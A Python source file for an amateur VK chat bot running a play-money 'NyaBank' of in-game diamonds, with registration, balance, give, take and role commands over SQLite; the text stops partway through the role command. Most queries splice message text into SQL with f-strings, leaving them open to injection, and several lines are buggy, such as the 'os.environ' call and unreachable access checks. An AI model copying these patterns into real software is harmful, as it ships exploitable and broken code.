import vk_api
import sqlite3
import os
from vk_api.longpoll import VkLongPoll, VkEventType

global db
global sql
db = sqlite3.connect('server.db')
sql = db.cursor()

sql.execute("""CREATE TABLE IF NOT EXISTS users (
    login BIGINT,
    nick TEXT,
    cash BIGINT
)""")

db.commit()

sql.execute("""CREATE TABLE IF NOT EXISTS access (
    login BIGINT,
    access TEXT,
    issued BIGINT,
    workers BIGINT,
    admins BIGINT
)""")

db.commit()

sql.execute("""CREATE TABLE IF NOT EXISTS operation (
    operation BIGINT
)""")

db.commit()

token = os.environ('BOT_TOKEN')

global vk_session
global vk
global longpoll
vk_session = vk_api.VkApi(token = token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)

for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
        if event.text == '!Начать' or event.text == '!начать' or event.text == '!НАЧАТЬ':
            if event.from_user: #Если написали в лс
                user_login = event.user_id
                user_nick = 'NONE'
                user_standartt = 'USER'
                sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
                if sql.fetchone() is None:
                    sql.execute(f"INSERT INTO users VALUES (?, ?, ?)", (user_login, user_nick, 0))
                    db.commit()
                    sql.execute(f"INSERT INTO access VALUES (?, ?, ?, ?, ?)", (user_login, user_standartt, 0, 0, 0))
                    db.commit()
                    vk.messages.send(
                        user_id=event.user_id,
                        message=f'Вы успешно  зарегестрировались!\nНомер вашей карты в НяБанке: НЯ{user_login}\nВаш текущий ник: {user_nick}\nВаш текущий баланс: 0\nВаш статус: Игрок\nДля того чтобы установить ваш никнейм - обратитесь к администратору.',
                        random_id=0
                    )
                else:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='Вы уже зарегистрированы\nЕсли произошла ошибка и вы ещё не зарегестрированы в НяБанке, то обратитесь к администрации НяБанка.\nЧтобы сбросить данные - обратитесь к администрации бота',
                        random_id=0
                    )
            elif event.from_chat: #Если написали в Беседе
                vk.messages.send(
                    chat_id=event.chat_id,
                    message='囗山い五长丹...\nДанная команда доступна только в лс сообщества, Ня!',
                    random_id=0
                )
        if event.text == 'Начать' or event.text == 'начать' or event.text == 'НАЧАТЬ':
            if event.from_user:
                vk.messages.send(
                    user_id=event.user_id,
                    message='Привет, ты написал мне сообщение, а это значит что ты хочешь получить свой счёт в НяБанке\nЧтобы зарегестрировать в НяБанке - необходимо написать !Начать\nУдачного хранения своих сбережений, Ня!',
                    random_id=0
                )
        if event.text == '!help' or event.text == '!Help' or event.text == '!HELP':  # Если написали !Help или !help
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='Ваш уровень доступа: ERROR\nВ данный момент вам доступна только одна команда:\n!Начать - Чтобы получить свою карту',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='Ваш уровень доступа: ERROR\nВ данный момент вам доступна только одна команда:\n!Начать - Чтобы получить свою карту',
                        random_id=0
                    )
            else:
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    if event.from_user:  # Если написали в ЛС
                        if user_card_access == 'WORK':
                            if user_card_access == 'ADMIN':
                                vk.messages.send(  # Отправляем сообщение
                                    user_id=event.user_id,
                                    message='Ваш уровень доступа: 丹亼从仈卄\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!ник - сменить ник игроку\n!удалить - удалить карточку игрока\n!id - проверка id чата/игрока в боте',
                                    random_id=0
                                )
                            else:
                                vk.messages.send(  # Отправляем сообщение
                                    user_id=event.user_id,
                                    message='Ваш уровень доступа: Работник НяБанка\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!id - проверка id чата/игрока в боте',
                                    random_id=0
                                )
                        elif user_card_access == 'ADMIN':
                            vk.messages.send(  # Отправляем сообщение
                                user_id=event.user_id,
                                message='Ваш уровень доступа: 丹亼从仈卄\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!ник - сменить ник игроку\n!удалить - удалить карточку игрока\n!id - проверка id чата/игрока в боте',
                                random_id=0
                            )
                        else:
                            vk.messages.send(  # Отправляем сообщение
                                user_id=event.user_id,
                                message='Ваш уровень доступа: Игрок\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора',
                                random_id=0
                            )
                    elif event.from_chat:  # Если написали в Беседе
                        if user_card_access == 'WORK':
                            if user_card_access == 'ADMIN':
                                vk.messages.send(  # Отправляем сообщение
                                    chat_id=event.chat_id,
                                    message='Ваш уровень доступа: 丹亼从仈卄\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!ник - сменить ник игроку\n!удалить - удалить карточку игрока\n!id - проверка id чата/игрока в боте',
                                    random_id=0
                                )
                            else:
                                vk.messages.send(  # Отправляем сообщение
                                    chat_id=event.chat_id,
                                    message='Ваш уровень доступа: Работник НяБанка\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!id - проверка id чата/игрока в боте',
                                    random_id=0
                                )
                        elif user_card_access == 'ADMIN':
                            vk.messages.send(  # Отправляем сообщение
                                chat_id=event.chat_id,
                                message='Ваш уровень доступа: 丹亼从仈卄\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора\n!выдать - выдача игроку деньги\n!забрать - забрать деньги у игрока\n!ник - сменить ник игроку\n!удалить - удалить карточку игрока\n!id - проверка id чата/игрока в боте',
                                random_id=0
                            )
                        else:
                            vk.messages.send(  # Отправляем сообщение
                                chat_id=event.chat_id,
                                message='Ваш уровень доступа: Игрок\nВам доступны:\n!help - Все доступные команды\n!баланс - Ваш текущий баланс\n!report - вызов администратора',
                                random_id=0
                            )
        if event.text == '!Баланс' or event.text == '!баланс' or event.text == '!БАЛАНС': #Если написали /баланс или !баланс
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            for user_workers in sql.execute(f"SELECT workers FROM access WHERE login = '{user_card_number}'"):
                                user_card_workers = user_workers[0]
                                for user_admins in sql.execute(f"SELECT admins FROM access WHERE login = '{user_card_number}'"):
                                    user_card_admins = user_admins[0]
                                    for user_nickk in sql.execute(f"SELECT nick FROM users WHERE login = '{user_card_number}'"):
                                        nickk = user_nickk[0]
                                        if user_card_access == 'WORK':
                                            if event.from_user:
                                                vk.messages.send(
                                                    user_id=event.user_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: Работник НяБанка\nВы выдали: {user_card_issued} алмазов',
                                                    random_id=0
                                                )
                                            elif event.from_chat:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: Работник НяБанка',
                                                    random_id=0
                                                )
                                        elif user_card_access == 'ADMIN':
                                            if event.from_user:
                                                vk.messages.send(
                                                    user_id=event.user_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: 丹亼从仈卄\nВы выдали: {user_card_issued} алмазов\nВы назначили работников банка: {user_card_workers}\nВы назначили администраторов: {user_card_admins}',
                                                    random_id=0
                                                )
                                            elif event.from_chat:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: 丹亼从仈卄\nВы выдали: {user_card_issued} алмазов\nВы назначили работников банка: {user_card_workers}\nВы назначили администраторов: {user_card_admins}',
                                                    random_id=0
                                                )
                                        else:
                                            if event.from_user:
                                                vk.messages.send(
                                                    user_id=event.user_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: Игрок',
                                                    random_id=0
                                                )
                                            elif event.from_chat:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Номер вашей карты: НЯ{user_card_number}\nБаланс вашей карты: {user_balance}\nВаш ник: {nickk}\nВаш уровень доступа: Игрок',
                                                    random_id=0
                                                )
        if event.text[0:8] == '!выдать ':
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                idd = event.text[8:17]
                cashh = event.text[18:]
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            if user_card_access == 'WORK':
                                if event.from_user:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Произошла 囗山い五长丹:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                    db.commit()
                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                    db.commit()
                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                    db.commit()
                                                    for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                        oll_operation = all_cash_operation[0]
                                                        for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                            issueddd = user_issueddd[0]
                                                            for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                balanceee = user_transferrr[0]
                                                                vk.messages.send(
                                                                    user_id=event.user_id,
                                                                    message=f'Ваша должность: Работник НяБанка\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                    random_id=0
                                                                )
                                                                vk.messages.send(
                                                                    user_id=idd,
                                                                    message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                    random_id=0
                                                                )
                                elif event.from_chat:
                                    if event.chat_id == '1':
                                        vk.messages.send(
                                            user_id=event.user_id,
                                            message='囗山い五长丹...\nДанная команда запрешенна в этом чате.\nПопробуйте использовать её в чате для работников либо в лс.',
                                            random_id=0
                                        )
                                    elif event.chat_id == '2':
                                        sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                        if sql.fetchone() is None:
                                            if event.from_user:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Произошла 囗山い五长丹:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                    random_id=0
                                                )
                                        else:
                                            for all_operation in sql.execute("SELECT operation FROM operation"):
                                                operationn = all_operation[0]
                                                for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                    balancee = user_transferr[0]
                                                    for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                        issuedd = user_issuedd[0]
                                                        sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                        db.commit()
                                                        sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                        db.commit()
                                                        sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                        db.commit()
                                                        for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                            oll_operation = all_cash_operation[0]
                                                            for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                                issueddd = user_issueddd[0]
                                                                for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                    balanceee = user_transferrr[0]
                                                                    vk.messages.send(
                                                                        chat_id=event.chat_id,
                                                                        message=f'Ваша должность: Работник НяБанка\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                        random_id=0
                                                                    )
                                                                    vk.messages.send(
                                                                        user_id=idd,
                                                                        message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                        random_id=0
                                                                    )

                            if user_card_access == 'ADMIN':
                                if event.from_user:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Произошла 囗山い五长丹:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                    db.commit()
                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                    db.commit()
                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                    db.commit()
                                                    for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                        oll_operation = all_cash_operation[0]
                                                        for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                            issueddd = user_issueddd[0]
                                                            for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                balanceee = user_transferrr[0]
                                                                vk.messages.send(
                                                                    user_id=event.user_id,
                                                                    message=f'Ваша должность: 丹亼从仈卄\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                    random_id=0
                                                                )
                                                                vk.messages.send(
                                                                    user_id=idd,
                                                                    message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                    random_id=0
                                                                )
                                elif event.from_chat:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                chat_id=event.chat_id,
                                                message=f'Произошла 囗山い五长丹:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    sql.execute(f"UPDATE users SET cash = cash + {int(cashh)} WHERE login = '{idd}'")
                                                    db.commit()
                                                    sql.execute(f'UPDATE operation SET operation = operation + {int(cashh)}')
                                                    db.commit()
                                                    sql.execute(f"UPDATE access SET issued = issued + {int(cashh)} WHERE login = '{user_card_number}'")
                                                    db.commit()
                                                    for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                        oll_operation = all_cash_operation[0]
                                                        for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                            issueddd = user_issueddd[0]
                                                            for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                balanceee = user_transferrr[0]
                                                            vk.messages.send(
                                                                chat_id=event.chat_id,
                                                                message=f'Ваша должность: 丹亼从仈卄\nВы успешно выдали {cashh} алмазов на карту под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                random_id=0
                                                            )
                                                            vk.messages.send(
                                                                user_id=idd,
                                                                message=f'На вашу карту под номером НЯ{idd} положили {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                random_id=0
                                                            )
        if event.text[0:9] == '!забрать ':
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                idd = event.text[9:18]
                cashh = event.text[19:]
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            if user_card_access == 'WORK':
                                if event.from_user:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Произошла 囗山い五长丹:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    if int(user_balance) >= int(cashh):
                                                        if int(operationn) >= int(cashh):
                                                            sql.execute(f"UPDATE users SET cash = cash -{int(cashh)} WHERE login = '{idd}'")
                                                            db.commit()
                                                            sql.execute(f"UPDATE operation SET operation = operation - {int(cashh)}")
                                                            db.commit()
                                                            for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                                oll_operation = all_cash_operation[0]
                                                                for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                                    issueddd = user_issueddd[0]
                                                                    for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                        balanceee = user_transferrr[0]
                                                                        vk.messages.send(
                                                                            user_id=event.user_id,
                                                                            message=f'Ваша должность: Работник НяБанка\nВы успешно забрали {cashh} алмазов с карты под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                            random_id=0
                                                                        )
                                                                        vk.messages.send(
                                                                            user_id=idd,
                                                                            message=f'С вашей карты под номером НЯ{idd} сняли {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                            random_id=0
                                                                        )
                                                        else:
                                                            vk.messages.send(
                                                                user_id=event.user_id,
                                                                message=f'囗山い五长丹...\nВы не смогли снять деньги...\nВ банке недостаточно 从仨从五尸丹卄.\nВ данный момент в банке: {operationn} 从仨从五尸丹卄.',
                                                                random_id=0
                                                            )
                                                    else:
                                                        vk.messages.send(
                                                            user_id=event.user_id,
                                                            message=f'囗山い五长丹...\nВы не смогли снять деньги...\nНа карте НЯ{idd} недостаточно 从仨从五尸丹卄.\nВ данный момент на карте НЯ{idd}: {user_balance} 从仨从五尸丹卄.',
                                                            random_id=0
                                                        )
                                elif event.from_chat:
                                    if event.chat_id == '1':
                                        vk.messages.send(
                                            user_id=event.user_id,
                                            message='囗山い五长丹...\nДанная команда запрешенна в этом чате.\nПопробуйте использовать её в чате для работников либо в лс.',
                                            random_id=0
                                        )
                                    elif event.chat_id == '2':
                                        sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                        if sql.fetchone() is None:
                                            if event.from_user:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                    random_id=0
                                                )
                                        else:
                                            for all_operation in sql.execute("SELECT operation FROM operation"):
                                                operationn = all_operation[0]
                                                for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                    balancee = user_transferr[0]
                                                    for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                        issuedd = user_issuedd[0]
                                                        if int(user_balance) >= int(cashh):
                                                            if int(operationn) >= int(cashh):
                                                                sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                                db.commit()
                                                                sql.execute(f"UPDATE operation SET operation = operation - {int(cashh)}")
                                                                db.commit()
                                                                for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                                    oll_operation = all_cash_operation[0]
                                                                    for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                                        issueddd = user_issueddd[0]
                                                                        for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                            balanceee = user_transferrr[0]
                                                                            vk.messages.send(
                                                                                user_id=event.user_id,
                                                                                message=f'Ваша должность: Работник НяБанка\nВы успешно забрали {cashh} алмазов с карты под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                                random_id=0
                                                                            )
                                                                            vk.messages.send(
                                                                                user_id=idd,
                                                                                message=f'С вашей карты под номером НЯ{idd} сняли {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                                random_id=0
                                                                            )
                                                            else:
                                                                vk.messages.send(
                                                                    user_id=event.user_id,
                                                                    message=f'囗山い五长丹...\nВы не смогли снять деньги...\nВ банке недостаточно 从仨从五尸丹卄.\nВ данный момент в банке: {operationn} 从仨从五尸丹卄.',
                                                                    random_id=0
                                                                )
                                                        else:
                                                            vk.messages.send(
                                                                user_id=event.user_id,
                                                                message=f'囗山い五长丹...\nВы не смогли снять деньги...\nНа карте НЯ{idd} недостаточно 从仨从五尸丹卄.\nВ данный момент на карте НЯ{idd}: {user_balance} 从仨从五尸丹卄.',
                                                                random_id=0
                                                            )
                            if user_card_access == 'ADMIN':
                                if event.from_user:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                    db.commit()
                                                    sql.execute(f'UPDATE operation SET operation = operation - {int(cashh)}')
                                                    db.commit()
                                                    for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                        oll_operation = all_cash_operation[0]
                                                        for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                            issueddd = user_issueddd[0]
                                                            for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                balanceee = user_transferrr[0]
                                                            vk.messages.send(
                                                                user_id=event.user_id,
                                                                message=f'Ваша должность: 丹亼从仈卄\nВы успешно забрали {cashh} алмазов с карты под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                random_id=0
                                                            )
                                                            vk.messages.send(
                                                                user_id=idd,
                                                                message=f'С вашей карты под номером НЯ{idd} сняли {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                random_id=0
                                                            )
                                elif event.from_chat:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                chat_id=event.chat_id,
                                                message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        for all_operation in sql.execute("SELECT operation FROM operation"):
                                            operationn = all_operation[0]
                                            for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                balancee = user_transferr[0]
                                                for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                    issuedd = user_issuedd[0]
                                                    sql.execute(f"UPDATE users SET cash = cash - {int(cashh)} WHERE login = '{idd}'")
                                                    db.commit()
                                                    sql.execute(f'UPDATE operation SET operation = operation - {int(cashh)}')
                                                    db.commit()
                                                    for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                        oll_operation = all_cash_operation[0]
                                                        for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                            issueddd = user_issueddd[0]
                                                            for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                balanceee = user_transferrr[0]
                                                            vk.messages.send(
                                                                chat_id=event.chat_id,
                                                                message=f'Ваша должность: 丹亼从仈卄\nВы успешно забрали {cashh} алмазов с карты под номером НЯ{idd}.\nНовый баланс карты: {balanceee}.\nЗа все время вы выдали: {issueddd} алмазов\nВсего алмазов в банке: {oll_operation}.',
                                                                random_id=0
                                                            )
                                                            vk.messages.send(
                                                                user_id=idd,
                                                                message=f'С вашей карты под номером НЯ{idd} сняли {cashh} алмазов.\nНовый баланс карты: {balanceee}.',
                                                                random_id=0
                                                            )
        if event.text[0:6] == '!роль ':
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                idd = event.text[6:15]
                new_access = event.text[16:]
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            if user_card_access == 'ADMIN':
                                if new_access == 'WORK' or new_access == 'ADMIN':
                                    if event.from_user:
                                        sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                        if sql.fetchone() is None:
                                            if event.from_user:
                                                vk.messages.send(
                                                    user_id=event.user_id,
                                                    message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                    random_id=0
                                                )
                                        else:
                                            for all_operation in sql.execute("SELECT operation FROM operation"):
                                                operationn = all_operation[0]
                                                for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                    balancee = user_transferr[0]
